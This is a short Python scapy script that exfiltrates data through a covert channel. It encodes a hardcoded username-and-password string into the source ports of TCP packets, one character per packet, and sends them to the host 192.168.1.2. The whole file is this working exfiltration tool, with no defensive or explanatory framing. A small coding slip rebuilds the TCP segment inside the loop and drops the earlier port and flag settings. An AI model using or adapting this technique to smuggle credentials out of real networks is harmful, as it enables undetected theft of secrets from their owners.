#!/usr/bin/python -Btt

import sys
from scapy.all import *

def main(argv):
	packet = IP(dst='192.168.1.2')
	segment = TCP(dport=80, flags=0x02)
	
	file = 'mrbaasman : P@s5w0Rt'
	
	for c in file:
		segment = TCP(sport=ord(c) + 10000)
		send(packet/segment)

if __name__ == '__main__':
	main(sys.argv)
